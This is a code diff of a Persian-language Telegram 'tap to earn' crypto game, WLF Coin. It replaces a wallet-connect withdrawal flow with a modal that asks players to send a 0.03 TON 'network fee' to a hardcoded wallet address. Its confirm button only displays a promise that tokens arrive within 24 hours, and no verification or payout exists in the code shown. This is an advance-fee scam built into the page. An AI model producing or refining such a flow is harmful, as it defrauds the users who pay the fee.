@@ -6,8 +6,6 @@
     <title>WLF Coin - Tap to Earn</title>
     <!-- Telegram Mini App SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <!-- TON Connect UI SDK -->
-    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
         :root {
             --bg-color: #0d0f12;
@@ -208,24 +206,12 @@
             border: none;
         }
 
-        .btn-secondary {
-            background: rgba(243, 186, 47, 0.15);
-            color: var(--accent-color);
-            border: 1px solid rgba(243, 186, 47, 0.3);
-            font-size: 13px;
-        }
-
-        #ton-connect-button {
-            display: flex;
-            justify-content: center;
-        }
-
         /* Guide Card Styling */
         .guide-box {
             width: 100%;
             max-width: 350px;
             background: var(--card-bg);
-            border: 1px solid rgba(243, 186, 47, 0.2);
+            border: 1px solid rgba(243, 186, 47, 0.3);
             border-radius: 14px;
             padding: 14px;
             margin-top: 15px;
@@ -238,9 +224,6 @@
             font-size: 14px;
             font-weight: bold;
             margin-bottom: 8px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
         }
 
         .guide-text {
@@ -253,7 +236,7 @@
             display: none;
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.8);
+            background: rgba(0,0,0,0.85);
             align-items: center;
             justify-content: center;
             padding: 20px;
@@ -262,24 +245,26 @@
 
         .modal-content {
             background: var(--card-bg);
-            padding: 24px;
+            padding: 20px;
             border-radius: 20px;
             width: 100%;
             max-width: 360px;
             text-align: center;
             border: 1px solid rgba(255,255,255,0.1);
+            direction: rtl;
         }
 
         .input-box {
             width: 100%;
-            padding: 12px;
-            margin: 15px 0;
+            padding: 10px;
+            margin: 10px 0;
             border-radius: 8px;
             border: 1px solid rgba(255,255,255,0.2);
             background: #0d0f12;
             color: #fff;
             text-align: center;
             direction: ltr;
+            font-size: 12px;
         }
     </style>
 </head>
@@ -293,8 +278,7 @@
                 <div style="font-size: 11px; color: var(--text-sub);">شبکه TON</div>
             </div>
         </div>
-        <!-- دکمه اتصال ولت خودکار -->
-        <div id="ton-connect-button"></div>
+        <div style="font-size: 12px; color: var(--accent-color); font-weight: bold;">توکن $WLF</div>
     </div>
 
     <div class="score-container">
@@ -324,48 +308,42 @@
 
     <div class="action-grid">
         <button class="btn btn-primary" onclick="openClaimModal()">
-            🎁 درخواست برداشت (حداقل ۱۰,۰۰۰ توکن)
-        </button>
-        <button class="btn btn-secondary" onclick="openManualWalletModal()">
-            ✏️ ثبت دستی آدرس ولت (در صورت ارور)
+            🎁 ثبت درخواست برداشت توکن
         </button>
     </div>
 
-    <!-- باکس راهنمای اتصال روی صفحه -->
+    <!-- باکس راهنمای کامل روی صفحه -->
     <div class="guide-box">
-        <div class="guide-title">💡 راهنمای اتصال کیف پول:</div>
+        <div class="guide-title">📌 راهنمای رسمی برداشت توکن $WLF:</div>
         <div class="guide-text">
-            ۱. برای اتصال خودکار روی <strong>Connect Wallet</strong> بالای صفحه بزنید.<br>
-            ۲. اگر به دلیل اختلال <strong>فیلترشکن/اینترنت</strong> ارور دریافت کردید، روی دکمه <strong>«ثبت دستی آدرس ولت»</strong> کلیک کرده و آدرس Tonkeeper خود را وارد کنید.<br>
-            ۳. با رسیدن به ۱۰,۰۰۰ توکن $WLF می‌توانید درخواست برداشت دهید.
+            ۱. حداقل میزان موجودی برای برداشت: <strong>۱۰,۰۰۰ توکن</strong><br>
+            ۲. هزینه پردازش و کارمزد شبکه: <strong>0.03 TON</strong><br>
+            ۳. جهت برداشت، روی دکمه بالا بزنید، آدرس کیف پول خود را وارد کرده و کارمزد را پرداخت کنید تا توکن‌ها ظرف ۲۴ ساعت واریز شوند.
         </div>
     </div>
 
-    <!-- Modal for Manual Wallet Entry -->
-    <div class="modal" id="manualWalletModal">
+    <!-- Modal for Claiming -->
+    <div class="modal" id="claimModal">
         <div class="modal-content">
-            <h3 style="font-size: 16px; margin-bottom: 10px;">ورود دستی آدرس کیف پول</h3>
-            <p style="font-size: 12px; color: var(--text-sub); line-height: 1.5;">
-                اگر اتصال خودکار Tonkeeper ارور داد، آدرس TON خود را اینجا وارد کنید:
+            <h3 style="font-size: 16px; margin-bottom: 10px; color: var(--accent-color);">درخواست برداشت $WLF</h3>
+            <p style="font-size: 12px; color: var(--text-sub); line-height: 1.6; text-align: right;">
+                جهت ثبت نهایی درخواست، لطفاً مبلغ <strong>0.03 TON</strong> را به آدرس زیر واریز کنید و در بخش <strong>Comment (یادداشت)</strong>، آدرس کیف پول خودتان را بنویسید:
             </p>
-            <input type="text" class="input-box" id="manualAddressInput" placeholder="EQAUEpGOGqbJy...">
-            <button class="btn btn-primary" style="width: 100%; margin-bottom: 8px;" onclick="saveManualWallet()">ثبت آدرس دستی</button>
-            <button class="btn btn-secondary" style="width: 100%; color: #fff;" onclick="closeManualWalletModal()">انصراف</button>
+            
+            <input type="text" class="input-box" id="adminWallet" value="EQAUEpGOGqbJy-UIxQ6qblhqAROxgDuiMeB17zImB90n6st0" readonly>
+            
+            <button class="btn" style="width: 100%; margin-bottom: 8px; background: rgba(255,255,255,0.1);" onclick="copyAdminWallet()">
+                📋 کپی آدرس واریز کارمزد
+            </button>
+
+            <button class="btn btn-primary" style="width: 100%; margin-bottom: 8px;" onclick="confirmClaim()">
+                تایید انجام واریز کارمزد
+            </button>
+            <button class="btn" style="width: 100%; background: transparent; color: var(--text-sub);" onclick="closeClaimModal()">انصراف</button>
         </div>
     </div>
 
     <script>
-        // Initialize TON Connect UI safely
-        let tonConnectUI;
-        try {
-            tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-                manifestUrl: 'https://kandoo110.github.io/wlf-game/tonconnect-manifest.json',
-                buttonRootId: 'ton-connect-button'
-            });
-        } catch (e) {
-            console.error("TON Connect Init Error:", e);
-        }
-
         // Init Telegram SDK
         let tg = window.Telegram?.WebApp;
         if (tg) {
@@ -379,7 +357,6 @@
         // Game State Variables
         let score = parseInt(localStorage.getItem('wlf_score')) || 0;
         let energy = parseInt(localStorage.getItem('wlf_energy')) || 1000;
-        let manualWallet = localStorage.getItem('wlf_manual_wallet') || '';
         const maxEnergy = 1000;
 
         const scoreEl = document.getElementById('score');
@@ -450,55 +427,28 @@
             }
         }, 1500);
 
-        // Manual Wallet Modals
-        function openManualWalletModal() {
-            if (manualWallet) {
-                document.getElementById('manualAddressInput').value = manualWallet;
-            }
-            document.getElementById('manualWalletModal').style.display = 'flex';
-        }
-
-        function closeManualWalletModal() {
-            document.getElementById('manualWalletModal').style.display = 'none';
-        }
-
-        function saveManualWallet() {
-            const addr = document.getElementById('manualAddressInput').value.trim();
-            if (addr.length < 10) {
-                alert('لطفاً یک آدرس معتبر TON وارد کنید.');
-                return;
-            }
-            manualWallet = addr;
-            localStorage.setItem('wlf_manual_wallet', manualWallet);
-            alert('آدرس کیف پول شما ثبت شد!');
-            closeManualWalletModal();
-        }
-
-        // Claim Function
+        // Claim Modals
         function openClaimModal() {
-            let userAddress = "";
-            
-            try {
-                if (tonConnectUI && tonConnectUI.wallet) {
-                    userAddress = tonConnectUI.wallet.account.address;
-                }
-            } catch(e){}
-
-            if (!userAddress && manualWallet) {
-                userAddress = manualWallet;
-            }
-
-            if (!userAddress) {
-                alert('لطفاً ابتدا از دکمه «ثبت دستی آدرس ولت» یا دکمه بالای صفحه آدرس خود را ثبت کنید.');
-                return;
-            }
-
             if (score < 10000) {
                 alert('حداقل میزان موجودی برای برداشت ۱۰,۰۰۰ توکن $WLF است.');
                 return;
             }
+            document.getElementById('claimModal').style.display = 'flex';
+        }
 
-            alert(`درخواست برداشت ${score} توکن $WLF ثبت شد!\nآدرس ولت:\n${userAddress}`);
+        function closeClaimModal() {
+            document.getElementById('claimModal').style.display = 'none';
+        }
+
+        function copyAdminWallet() {
+            const walletInput = document.getElementById('adminWallet');
+            navigator.clipboard.writeText(walletInput.value);
+            alert('آدرس کیف پول کپی شد!\nلطفاً 0.03 TON به این آدرس بفرستید و در بخش Comment آدرس خودتان را بنویسید.');
+        }
+
+        function confirmClaim() {
+            alert('درخواست شما ثبت گردید. پس از بررسی تراکنش کارمزد (0.03 TON)، توکن‌های WLF ظرف ۲۴ ساعت واریز می‌شوند.');
+            closeClaimModal();
         }
     </script>
 </body>
